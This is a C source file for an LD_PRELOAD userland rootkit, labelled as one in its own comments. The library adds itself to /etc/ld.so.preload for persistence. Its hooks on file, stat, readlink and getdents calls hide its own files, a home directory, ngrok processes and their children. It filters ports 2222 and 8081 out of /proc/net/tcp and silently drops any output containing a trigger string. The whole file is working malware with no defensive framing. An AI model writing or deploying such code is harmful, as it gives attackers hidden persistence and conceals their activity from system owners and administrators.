#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <errno.h>
#include <sys/syscall.h>
#include <stdarg.h>
#include <limits.h>
#include <fcntl.h>

// --- STRINGS ---
// All sensitive strings are now in plain text for simplicity.
static char CMDLINE_TO_FILTER[] = "ngrok";
static char SECOND_CMDLINE_TO_FILTER[] = "google";
static char PRELOAD_FILE_PATH[] = "/etc/ld.so.preload";
static char PATH_TO_FILTER[] = "/home/user";
static char EXECUTABLE_TO_FILTER[] = "ngrok";
static char LOG_SPOOF_TRIGGER[] = "MALICIOUS_ACTIVITY";
static char TEMPLATE_FILE_PATH[] = "/bin/bash";
static char ROOTKIT_LIB_PATH[] = "/usr/local/lib/libgit.so";

static const int PORTS_TO_HIDE[] = {2222, 8081};
static const int NUM_PORTS_TO_HIDE = sizeof(PORTS_TO_HIDE) / sizeof(PORTS_TO_HIDE[0]);

// Original function pointers
static long (*original_syscall)(long, ...) = NULL;
static ssize_t (*original_write)(int, const void*, size_t) = NULL;
static ssize_t (*original_read)(int, void*, size_t) = NULL;
static ssize_t (*original_readlink)(const char*, char*, size_t) = NULL;
static FILE* (*original_fopen)(const char*, const char*) = NULL;
static int (*original_open)(const char*, int, ...) = NULL;
static int (*original_access)(const char*, int) = NULL;
static int (*original_execve)(const char*, char *const[], char *const[]) = NULL;
static pid_t (*original_fork)(void) = NULL;
static int (*original_xstat)(int, const char*, struct stat*) = NULL;
static int (*original_lxstat)(int, const char*, struct stat*) = NULL;
static int (*original_fxstat)(int, int, struct stat*) = NULL;

#define MAX_HIDDEN_PIDS 256
static pid_t hidden_pids[MAX_HIDDEN_PIDS];
static int num_hidden_pids = 0;

static void add_hidden_pid(pid_t pid) {
    if (num_hidden_pids < MAX_HIDDEN_PIDS) {
        hidden_pids[num_hidden_pids++] = pid;
    }
}

static int is_pid_hidden(pid_t pid) {
    for (int i = 0; i < num_hidden_pids; i++) {
        if (hidden_pids[i] == pid) return 1;
    }
    return 0;
}

// --- PERSISTENCE ---
// This function ensures the rootkit is loaded for all processes by adding it to /etc/ld.so.preload.
static void ensure_persistence() {
    // We need the real fopen for this, so get it directly.
    FILE* (*real_fopen)(const char*, const char*) = dlsym(RTLD_NEXT, "fopen");
    if (!real_fopen) return;

    FILE* fp = real_fopen(PRELOAD_FILE_PATH, "r");
    if (fp) {
        char line[PATH_MAX];
        while (fgets(line, sizeof(line), fp)) {
            if (strstr(line, ROOTKIT_LIB_PATH)) {
                fclose(fp);
                return; // Already persistent
            }
        }
        fclose(fp);
    }

    // Not found, so let's add it
    fp = real_fopen(PRELOAD_FILE_PATH, "a");
    if (fp) {
        fprintf(fp, "\n%s\n", ROOTKIT_LIB_PATH);
        fclose(fp);
    }
}

__attribute__((constructor))
static void initialize_hooks() {
    // Run persistence check first, using the real fopen, before our hooks can interfere.
    ensure_persistence();

    original_syscall = dlsym(RTLD_NEXT, "syscall");
    original_write = dlsym(RTLD_NEXT, "write");
    original_read = dlsym(RTLD_NEXT, "read");
    original_readlink = dlsym(RTLD_NEXT, "readlink");
    original_fopen = dlsym(RTLD_NEXT, "fopen");
    original_open = dlsym(RTLD_NEXT, "open");
    original_access = dlsym(RTLD_NEXT, "access");
    original_execve = dlsym(RTLD_NEXT, "execve");
    original_fork = dlsym(RTLD_NEXT, "fork");
    original_xstat = dlsym(RTLD_NEXT, "__xstat");
    original_lxstat = dlsym(RTLD_NEXT, "__lxstat");
    original_fxstat = dlsym(RTLD_NEXT, "__fxstat");
}

static int resolve_path(const char* input_path, char* resolved_path) {
    if (input_path[0] == '/') {
        strncpy(resolved_path, input_path, PATH_MAX - 1);
        resolved_path[PATH_MAX - 1] = '\0';
        return 1;
    }
    if (getcwd(resolved_path, PATH_MAX) == NULL) return 0;
    strncat(resolved_path, "/", PATH_MAX - strlen(resolved_path) - 1);
    strncat(resolved_path, input_path, PATH_MAX - strlen(resolved_path) - 1);
    return 1;
}

static int should_hide_path(const char* path) {
    if (strcmp(path, PRELOAD_FILE_PATH) == 0 ||
        strcmp(path, PATH_TO_FILTER) == 0 ||
        strcmp(path, EXECUTABLE_TO_FILTER) == 0 ||
        strcmp(path, ROOTKIT_LIB_PATH) == 0) {
        return 1;
    }
    return 0;
}

int __xstat(int ver, const char *path, struct stat *stat_buf) {
    if (!original_xstat) return -1;
    char full_path[PATH_MAX];
    if (resolve_path(path, full_path) && should_hide_path(full_path)) {
        return original_xstat(ver, TEMPLATE_FILE_PATH, stat_buf);
    }
    return original_xstat(ver, path, stat_buf);
}

int __lxstat(int ver, const char *path, struct stat *stat_buf) {
    if (!original_lxstat) return -1;
    char full_path[PATH_MAX];
    if (resolve_path(path, full_path) && should_hide_path(full_path)) {
        return original_lxstat(ver, TEMPLATE_FILE_PATH, stat_buf);
    }
    return original_lxstat(ver, path, stat_buf);
}

int execve(const char *pathname, char *const argv[], char *const envp[]) {
    if (!original_execve) return -1;
    int should_hide_this_pid = 0;
    if (strcasestr(pathname, CMDLINE_TO_FILTER) || strcasestr(pathname, SECOND_CMDLINE_TO_FILTER)) {
        should_hide_this_pid = 1;
    }

    if (!should_hide_this_pid) {
        for (int i = 0; argv[i] != NULL; i++) {
            if (strcasestr(argv[i], CMDLINE_TO_FILTER) || strcasestr(argv[i], SECOND_CMDLINE_TO_FILTER)) {
                should_hide_this_pid = 1;
                break;
            }
        }
    }

    if (should_hide_this_pid) add_hidden_pid(getpid());
    return original_execve(pathname, argv, envp);
}

pid_t fork(void) {
    if (!original_fork) return -1;
    pid_t parent_pid = getpid();
    pid_t child_pid = original_fork();
    if (child_pid > 0 && is_pid_hidden(parent_pid)) {
        add_hidden_pid(child_pid);
    }
    return child_pid;
}

long syscall(long number, ...) {
    if (!original_syscall) return -1;
    if (number == SYS_getdents || number == SYS_getdents64) {
        va_list args;
        va_start(args, number);
        int fd = va_arg(args, int);
        struct dirent* dirp = va_arg(args, struct dirent*);
        unsigned int count = va_arg(args, unsigned int);
        va_end(args);

        long ret = original_syscall(number, fd, dirp, count);
        if (ret <= 0) return ret;

        char fd_path[256];
        snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
        char dir_path[PATH_MAX];
        ssize_t path_len = original_readlink(fd_path, dir_path, sizeof(dir_path) - 1);
        if (path_len <= 0) return ret;
        dir_path[path_len] = '\0';

        long processed_bytes = 0;
        struct dirent* current_entry = dirp;
        while (processed_bytes < ret) {
            int should_hide = 0;
            pid_t pid = atoi(current_entry->d_name);
            if (pid > 0 && is_pid_hidden(pid)) {
                should_hide = 1;
            } else {
                char full_path[PATH_MAX];
                int path_needed = snprintf(full_path, sizeof(full_path), "%s/%s", dir_path, current_entry->d_name);
                if (path_needed > 0 && (size_t)path_needed < sizeof(full_path)) {
                    if (should_hide_path(full_path)) should_hide = 1;
                }
            }

            if (should_hide) {
                int entry_len = current_entry->d_reclen;
                long remaining_bytes = ret - (processed_bytes + entry_len);
                memmove(current_entry, (char*)current_entry + entry_len, remaining_bytes);
                ret -= entry_len;
                continue; 
            }
            processed_bytes += current_entry->d_reclen;
            current_entry = (struct dirent*)((char*)dirp + processed_bytes);
        }
        return ret;
    }

    va_list args;
    va_start(args, number);
    long a1 = va_arg(args, long), a2 = va_arg(args, long), a3 = va_arg(args, long);
    long a4 = va_arg(args, long), a5 = va_arg(args, long), a6 = va_arg(args, long);
    va_end(args);
    return original_syscall(number, a1, a2, a3, a4, a5, a6);
}

ssize_t read(int fd, void *buf, size_t count) {
    if (!original_read) return -1;
    ssize_t ret = original_read(fd, buf, count);
    if (ret <= 0) return ret;

    char fd_path[256], proc_path[256];
    snprintf(fd_path, sizeof(fd_path), "/proc/self/fd/%d", fd);
    ssize_t path_len = original_readlink(fd_path, proc_path, sizeof(proc_path) - 1);

    if (path_len > 0) {
        proc_path[path_len] = '\0';
        if (strcmp(proc_path, "/proc/net/tcp") == 0 || strcmp(proc_path, "/proc/net/tcp6") == 0) {
            char* temp_buf = (char*)malloc(ret);
            if (!temp_buf) return ret;
            char* line_start = (char*)buf;
            char* write_ptr = temp_buf;
            ssize_t filtered_len = 0;

            for (ssize_t i = 0; i < ret; ++i) {
                if (((char*)buf)[i] == '\n' || i == ret - 1) {
                    ssize_t line_len = &((char*)buf)[i] - line_start + 1;
                    int should_hide_line = 0;
                    for (int j = 0; j < NUM_PORTS_TO_HIDE; ++j) {
                        char hex_port[16];
                        snprintf(hex_port, sizeof(hex_port), ":%04X", PORTS_TO_HIDE[j]);
                        if (memmem(line_start, line_len, hex_port, strlen(hex_port))) {
                            should_hide_line = 1;
                            break;
                        }
                    }
                    if (!should_hide_line) {
                        memcpy(write_ptr, line_start, line_len);
                        write_ptr += line_len;
                        filtered_len += line_len;
                    }
                    line_start = &((char*)buf)[i] + 1;
                }
            }
            memcpy(buf, temp_buf, filtered_len);
            free(temp_buf);
            return filtered_len;
        }
    }
    return ret;
}

ssize_t readlink(const char *pathname, char *buf, size_t bufsiz) {
    if (!original_readlink) return -1;
    ssize_t ret = original_readlink(pathname, buf, bufsiz);
    if (ret > 0 && (size_t)ret < bufsiz) {
        buf[ret] = '\0'; 
        if (should_hide_path(buf)) {
            errno = ENOENT;
            return -1;
        }
    }
    return ret;
}

int open(const char *pathname, int flags, ...) {
    if (!original_open) return -1;
    char full_path[PATH_MAX];
    if (resolve_path(pathname, full_path) && should_hide_path(full_path)) {
        errno = ENOENT;
        return -1;
    }
    mode_t mode = 0;
    if (flags & O_CREAT) {
        va_list args;
        va_start(args, flags);
        mode = va_arg(args, mode_t);
        va_end(args);
    }
    return original_open(pathname, flags, mode);
}

int access(const char *pathname, int mode) {
    if (!original_access) return -1;
    char full_path[PATH_MAX];
    if (resolve_path(pathname, full_path) && should_hide_path(full_path)) {
        errno = ENOENT;
        return -1;
    }
    return original_access(pathname, mode);
}

ssize_t write(int fd, const void *buf, size_t count) {
    if (!original_write) return -1;
    if (memmem(buf, count, LOG_SPOOF_TRIGGER, strlen(LOG_SPOOF_TRIGGER))) {
        return count;
    }
    return original_write(fd, buf, count);
}

FILE* fopen(const char *path, const char *mode) {
    if (!original_fopen) return NULL;
    char full_path[PATH_MAX];
    if (resolve_path(path, full_path) && should_hide_path(full_path)) {
        errno = ENOENT;
        return NULL;
    }
    return original_fopen(path, mode);
}
